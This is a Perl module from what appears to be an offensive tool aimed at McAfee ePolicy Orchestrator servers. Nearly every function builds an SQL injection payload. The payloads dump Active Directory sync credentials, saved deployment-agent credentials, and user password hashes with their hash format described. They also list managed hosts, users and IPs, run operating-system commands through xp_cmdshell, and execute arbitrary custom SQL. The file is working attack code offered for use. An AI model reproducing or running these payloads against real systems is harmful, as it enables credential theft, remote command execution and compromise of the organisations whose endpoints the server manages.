package Epowner::Epo;

use Text::SimpleTable;

use strict;
use warnings;


sub mode_readdb_get_servername{

        my $this = shift;

	$this->mode_readdb_banner();
	$this->print_info_l2("    Parameters: ");
	print "Retrieving server hostname \n";

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
                "select ComputerName from dbo.EPOServerInfo;"
        );

        # Go
        my @results = $this->sql_execute($sqli);

        if(@results ne 0){
		print "      [+] ServerName: " . $results[0] . "\n" if $this->{verbose};
		$this->{server_servername} = $results[0];
	}
}



sub mode_readdb_get_mssql_whoami{

        my $this = shift;

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
                " exec master.dbo.xp_cmdshell 'whoami';"
        );

        # Go
        my @results = $this->sql_execute($sqli);

        if(@results ne 0){
                print "      [+] Who Am I ? : " . $results[0] . "\n" if $this->{verbose};
                $this->{server_mssql_whoami} = $results[0];
		return 1;	
        }
	return 0;
}


sub mode_readdb_get_mssql_runas_priv{

        my $this = shift;

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
                " exec master.dbo.xp_cmdshell 'reg query \"HKU\\S-1-5-19\"';"
        );

        # Go
        my @results = $this->sql_execute($sqli);

        if(@results ne 0){
                print "      [+] req query returned : " . $results[0] . "\n" if $this->{verbose};
               # $this->{server_mssql_whoami} = $results[0];
		if($results[0] =~ /Access is denied/){
			return 0;
		}else{
                	return 1;
		}
        }
        return 0;
}



sub mode_readdb_print_agents{

        my $this = shift;

	# get agents
        my @results = $this->mode_readdb_get_agents();

        if(@results ne 0){
                $this->print_ok ("[*] Got data !\n");

		my $t = Text::SimpleTable->new(	[15, 'HostName'], 
						[30, 'FQDN'],
						[50, 'OS'],
						[15, 'Username'],
						[15, 'IP addr'],
						[14, 'Last seen']
			);

                foreach my $res (@results){
                        my ($ParentId, $ComputerName, $Hostname, $OSType, $OSPlatform , $OSVersion, $OSServicePackVer, $UserName , $IPv4, $LastSeen)  = split(/\|/,$res);
			my $OS = $OSType . " ". $OSPlatform . " " . $OSVersion . " " . $OSServicePackVer;
			$t->row(	$ComputerName 	|| "N/A", 
					$Hostname 	|| "N/A", 
					$OS  		|| "N/A",
					$UserName 	|| "N/A" , 
					$IPv4	 	|| "N/A",
					$LastSeen	|| "N/A"
		 	);
		}
		$this->print_data ($t->draw());
        }else{
                $this->print_err ("[-] No data were found..\n");
        }

        return 1;



}

sub mode_readdb_get_syncdir {

        my $this = shift;

        $this->mode_readdb_banner();
        $this->print_info_l2("    Parameters: ");
        print "Retrieving Active Directory Sync credentials\n";

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
                "select server + '|' + authServer + '|' + authUser + '|' + authPassword from dbo.EPOSyncDir ;"
        );

        # Go
        my @results = $this->sql_execute($sqli);
        return (@results);
}


sub mode_readdb_get_deployagent_creds {

        my $this = shift;

        $this->mode_readdb_banner();
        $this->print_info_l2("    Parameters: ");
        print "Retrieving Deployment-Agents saved credentials\n";

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
		# Thanks to Alaeddine Mesbahi for this SQL statement
		"select Value + '|' + " .
			"(select Value from OrionPersonalPreferences t2 where t1.UserId=t2.UserId and t2.Name='computermgmt.deployagent.credentials.pwd') + '|' + " .
   			"(select Value from OrionPersonalPreferences t3 where t1.UserId=t3.UserId and t3.Name='computermgmt.deployagent.credentials.domain') " . 
		"from OrionPersonalPreferences as t1 where Name = 'computermgmt.deployagent.credentials.name' ;"
        );

        # Go
        my @results = $this->sql_execute($sqli);
        return (@results);
}



sub mode_readdb_get_agents {

        my $this = shift;

	$this->print_info("\n[*] Getting Agent list\n");
	$this->mode_readdb_banner();
	$this->print_info_l2("    Parameters: ");
        print "Retrieving Agent list\n";

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
		"select cast(prop.ParentId as varchar(11)) + '|' + prop.ComputerName + '|' + prop.IPHostname + '|' + prop.OSType + '|' + prop.OSPlatform + '|' " .
		"+ prop.OSVersion + '|' + prop.OSServicePackVer + '|' + prop.UserName + '|' + prop.IPAddress + '|' " . 
		"+ LEFT(DATENAME(MM, leaf.LastUpdate),3) + ' ' + RIGHT('0'+DATENAME(DD, leaf.LastUpdate),2) + ' ' + SUBSTRING(CONVERT(varchar,leaf.LastUpdate,0),13,7) " .  
		"from dbo.EPOComputerProperties as prop, EPOLeafNode as leaf where prop.ParentID = leaf.AutoID and leaf.Managed = 1;"	


#                "select cast(ParentId as varchar(11)) + '|' + ComputerName + '|' + IPHostname + '|' + OSType + '|' + OSPlatform + '|' + OSVersion " .
#		"+ '|' + OSServicePackVer + '|' + UserName + '|' + IPAddress from dbo.EPOComputerProperties;"
        );

        # Go
        my @results = $this->sql_execute($sqli);
	return (@results);
}


sub mode_readdb_print_users{

	my $this = shift;

	$this->print_info("\n[*] Getting accounts information\n");
	$this->mode_readdb_banner();
	$this->print_info_l2("    Parameters: ");
	print "Retrieving user hashes\n";

        #prepare SQL Injection
        my $sqli = $this->sql_prepare_select(
		"select Name + '|' + AuthURI from dbo.OrionUsers;"
		);

	# Go
	my @results = $this->sql_execute($sqli);

        if(@results ne 0){
                $this->print_ok ("[*] Got data !\n");

                my $t = Text::SimpleTable->new( [25, 'Username'],
                                                [60, 'AuthURI'],
                        );

                foreach my $res (@results){
			my ($user, $hash) = split(/\|/,$res);
			$t->row($user, $hash);
                }
		$this->print_data ($t->draw());
		print "Hash format is 'uri_escape(base64(SHA1(<password><salt>)<salt>))' where <salt> is 4 bytes length.\n";
        }else{
                $this->print_err ("[-] No data were found..\n");
        }

        return 1;

	

}


sub mode_readdb_banner{
	my $this = shift;
	$this->print_info_l1("[*] Call to ModeReadDB\n");
}




#====================================================================
# PRINT QUERY RESULT
#====================================================================
sub mode_readdb_manual_sql_query{

	my $this = shift;
	my $query = shift;  # SQL statement

	# banner mode
        $this->mode_readdb_banner();
        $this->print_info_l2("    Parameters: ");
        print "Custom SQL query: $query\n";

	# get query results
	my $sqli = $this->sql_prepare_select($query);
	my @results = $this->sql_execute($sqli);
 
        if(@results ne 0){
		# draw result
                $this->print_ok ("[*] Got data !\n");
                my $t = Text::SimpleTable->new( [100, 'Result'] );
                foreach my $res (@results){     
                        $t->row($res || "N/A");
                }
                $this->print_data ($t->draw());
        }else{
                $this->print_err ("[-] No data were found..\n");
        }
 
        return 1;
}

1;
